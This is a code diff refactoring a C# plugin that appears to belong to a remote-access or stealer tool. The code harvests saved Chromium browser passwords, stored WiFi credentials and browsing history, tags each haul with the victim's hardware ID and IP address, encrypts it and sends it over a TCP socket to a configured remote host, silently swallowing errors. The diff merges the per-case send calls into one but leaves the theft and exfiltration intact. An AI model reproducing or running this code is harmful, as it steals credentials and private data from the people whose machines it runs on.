@@ -1,5 +1,4 @@
 ﻿using Shared;
-using System.Collections.Generic;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
@@ -22,40 +21,32 @@ namespace Plugin
                 Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                 S.Connect(ep);
-                Shared.PacketTypes.PacketType T = (Shared.PacketTypes.PacketType)Param[0];
+                PacketType T = (PacketType)Param[0];
                 Data D = new Data();
+                D.HWID = HWID;
+                D.IP_Origin = BaseIP;
                 switch (T)
                 {
-                    case Shared.PacketTypes.PacketType.PASSWORDS:
+                    case PacketType.PASSWORDS:
                         await Task.Run(() => Chromium.Recovery(ref D));
-                        D.HWID = HWID;
-                        D.Type = Shared.PacketTypes.PacketType.PASSWORDS;
-                        D.IP_Origin = BaseIP;
-                        await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
+                        D.Type = PacketType.PASSWORDS;        
                         break;
 
-                    case Shared.PacketTypes.PacketType.WIFI:
+                    case PacketType.WIFI:
                        await Task.Run(() => Wifi.Recovery(ref D));
-                        D.HWID = HWID;
-                        D.Type = Shared.PacketTypes.PacketType.WIFI;
-                        D.IP_Origin = BaseIP;
-                        await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
+                        D.Type = PacketType.WIFI;
                         break;
 
-                    case Shared.PacketTypes.PacketType.HISTORY:
+                    case PacketType.HISTORY:
                         await Task.Run(() => History.Recovery(ref D));
-                        D.HWID = HWID;
-                        D.Type = Shared.PacketTypes.PacketType.HISTORY;
-                        D.IP_Origin = BaseIP;
-                        await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
+                        D.Type = PacketType.HISTORY;
                         break;
                 }
+                await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                 S.Close();
                 S.Dispose();
             }
-            catch (System.Exception)
-            {
-            }
+            catch {}
             finally 
             {
                 Shared.Utils.ClearMem();           
